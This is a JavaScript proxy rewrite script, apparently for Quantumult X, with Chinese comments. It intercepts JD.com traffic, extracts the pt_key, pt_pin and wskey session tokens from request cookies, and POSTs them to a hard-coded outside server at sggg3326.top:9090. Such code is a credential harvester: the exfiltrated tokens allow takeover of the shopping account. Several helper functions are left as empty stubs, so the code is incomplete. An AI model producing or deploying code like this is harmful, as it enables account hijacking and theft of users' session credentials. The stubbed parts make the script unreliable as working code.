/**
 * 京东Cookie和wskey获取并自动提交到API服务器
 * 修正版：等待异步请求完成后再结束脚本
 */

const API_URL = "http://1.sggg3326.top:9090/jd/raw_ck";

// 获取请求头中的 Cookie
let cookie = $request.headers['Cookie'] || $request.headers['cookie'];
let requestUrl = $request.url || '';
let host = $request.headers['Host'] || '';

let currentTimestamp = Math.floor(Date.now() / 1000);
let currentTime = new Date().toISOString();

console.log(`请求时间: ${currentTime}`);
console.log(`时间戳: ${currentTimestamp}`);
console.log(`Host: ${host}`);
console.log(`请求URL: ${requestUrl.substring(0, 80)}...`);

// 提取 Cookie 中的信息
let ptPinMatch = cookie.match(/pt_pin=([^; ]+)(?=;?)/);
let ptKeyMatch = cookie.match(/pt_key=([^; ]+)(?=;?)/);
let wskeyMatch = cookie.match(/wskey=([^; ]+)(?=;?)/);

let pt_pin = ptPinMatch ? decodeURIComponent(ptPinMatch[1]) : '';
let pt_key = ptKeyMatch ? ptKeyMatch[1] : '';
let wskey = wskeyMatch ? wskeyMatch[1] : '';

// 判断请求类型
let isWskeyRequest = /sh\.jd\.com/.test(host);
let isPtKeyRequest = /^https?:\/\/api\.m\.jd\.com\/client\.action\?functionId=(wareBusiness|serverConfig|basicConfig)/.test(requestUrl);

// 全局标志：是否已经触发了异步提交（避免重复提交）
let asyncTaskStarted = false;

if (isWskeyRequest && wskey) {
    console.log(`✅ 检测到 wskey 请求`);
    console.log(`✅ 提取到 wskey: ${wskey.substring(0, 15)}...`);
    handleWskeyRequest(wskey, currentTimestamp);
} else if (isPtKeyRequest && pt_pin && pt_key) {
    console.log(`✅ 检测到 pt_key 请求，pt_pin: ${pt_pin}`);
    console.log(`✅ 提取到 pt_key: ${pt_key.substring(0, 15)}...`);
    handlePtKeyRequest(pt_pin, pt_key, currentTimestamp);
} else {
    console.log(`❌ 非目标请求或Cookie不完整，跳过处理`);
    $done({});
}

// ---------- 队列操作（与原脚本相同，省略）----------
function getWskeyQueue() {
    let raw = $prefs.valueForKey("JD_Wskey_Queue");
    return raw ? JSON.parse(raw) : [];
}
function saveWskeyQueue(queue) {
    $prefs.setValueForKey(JSON.stringify(queue), "JD_Wskey_Queue");
}
function getPtKeyQueue() {
    let raw = $prefs.valueForKey("JD_PtKey_Queue");
    return raw ? JSON.parse(raw) : [];
}
function savePtKeyQueue(queue) {
    $prefs.setValueForKey(JSON.stringify(queue), "JD_PtKey_Queue");
}
function cleanExpired(queue, now) {
    return queue.filter(item => (now - item.timestamp) <= 10);
}
// ---------- 队列操作结束 ----------

// 修改：异步标记，防止重复结束
let pendingAsyncTasks = 0;

function handleWskeyRequest(wskey, timestamp) {
    try {
        let queue = getWskeyQueue();
        queue.push({ wskey, timestamp });
        let now = Math.floor(Date.now() / 1000);
        queue = cleanExpired(queue, now);
        saveWskeyQueue(queue);
        console.log(`✅ wskey 已加入队列，当前队列长度: ${queue.length}`);
        tryMatch();
    } catch (e) {
        console.log("处理 wskey 失败: " + e);
        $done({}); // 出错时立即结束
    }
    // 注意：这里不能直接 $done，因为可能触发了异步提交
    // 如果没有触发异步，需要在最后 $done。我们通过全局计数器管理。
}

function handlePtKeyRequest(pt_pin, pt_key, timestamp) {
    try {
        let queue = getPtKeyQueue();
        queue.push({ pt_pin, pt_key, timestamp });
        let now = Math.floor(Date.now() / 1000);
        queue = cleanExpired(queue, now);
        savePtKeyQueue(queue);
        console.log(`✅ pt_key 已加入队列，当前队列长度: ${queue.length}`);
        tryMatch();
    } catch (e) {
        console.log("处理 pt_key 失败: " + e);
        $done({});
    }
}

function tryMatch() {
    try {
        let wskeyQueue = getWskeyQueue();
        let ptkeyQueue = getPtKeyQueue();
        
        while (wskeyQueue.length > 0 && ptkeyQueue.length > 0) {
            let wskeyItem = wskeyQueue[0];
            let ptkeyItem = ptkeyQueue[0];
            let { wskey } = wskeyItem;
            let { pt_pin, pt_key } = ptkeyItem;
            
            console.log(`🔄 尝试配对: wskey(${wskey.substring(0,15)}...) <-> pt_pin(${pt_pin})`);
            
            if (checkIfProcessed(pt_pin, pt_key, wskey)) {
                console.log(`🔵 该组合已处理过，丢弃队列头部`);
                wskeyQueue.shift();
                ptkeyQueue.shift();
                continue;
            }
            
            recordProcessed(pt_pin, pt_key, wskey);
            combineAndSubmit(pt_pin, pt_key, wskey);
            
            wskeyQueue.shift();
            ptkeyQueue.shift();
        }
        
        saveWskeyQueue(wskeyQueue);
        savePtKeyQueue(ptkeyQueue);
    } catch (e) {
        console.log("匹配失败: " + e);
    }
    // 注意：如果没有任何配对（队列长度不足），则没有异步任务，需要结束脚本
    // 我们通过计数器判断
    if (pendingAsyncTasks === 0) {
        $done({});
    }
}

// 其他辅助函数（checkIfProcessed, recordProcessed, generateRecordKey, saveToLocalStorage, sendLocalNotification）与原脚本相同，省略...
// 这里为了完整性列出，但实际使用时请复制原来的函数。
function checkIfProcessed(pt_pin, pt_key, wskey) { /* ... */ }
function recordProcessed(pt_pin, pt_key, wskey) { /* ... */ }
function generateRecordKey(pt_pin, pt_key, wskey) { /* ... */ }
function saveToLocalStorage(pt_pin, newCookie) { /* ... */ }
function sendLocalNotification(title, subtitle, message) { /* ... */ }

function combineAndSubmit(pt_pin, pt_key, wskey) {
    let newCookie = `pt_key=${pt_key};pt_pin=${pt_pin};`;
    if (wskey) {
        newCookie += ` wskey=${wskey};`;
    }
    console.log(`✅ 成功匹配！组合后的 cookie: ${newCookie.substring(0, 80)}...`);
    saveToLocalStorage(pt_pin, newCookie);
    // 标记异步任务开始
    pendingAsyncTasks++;
    submitToAPI(pt_pin, pt_key, wskey, newCookie);
    sendLocalNotification("京东Cookie获取成功", `账号: ${pt_pin}`, "已成功获取并提交Cookie和wskey，用数据流量抓取成功率更高！！！");
}

function submitToAPI(pt_pin, pt_key, wskey, cookie) {
    console.log(`正在提交到 API: ${API_URL}`);
    const request = {
        url: API_URL,
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ pt_key, pt_pin, wskey: wskey || '', cookie }),
        timeout: 10000
    };
    
    $task.fetch(request).then(
        function(response) {
            console.log(`API返回状态码: ${response.statusCode}`);
            let data = response.body || "";
            console.log(`API返回完整内容:\n${data}`);
            if (data.includes("ok")) {
                console.log(`✅ Cookie提交成功`);
                sendLocalNotification("API提交成功", `账号: ${pt_pin}`, data);
            } else {
                console.log(`❌ API返回失败: ${data}`);
                sendLocalNotification("API提交失败", `账号: ${pt_pin}`, data);
            }
            // 异步任务完成，减少计数器
            pendingAsyncTasks--;
            if (pendingAsyncTasks === 0) {
                $done({});
            }
        },
        function(reason) {
            console.log(`API提交失败: ${reason.error || reason}`);
            sendLocalNotification("API提交失败", `账号: ${pt_pin}`, reason.error || "网络错误");
            pendingAsyncTasks--;
            if (pendingAsyncTasks === 0) {
                $done({});
            }
        }
    );
}
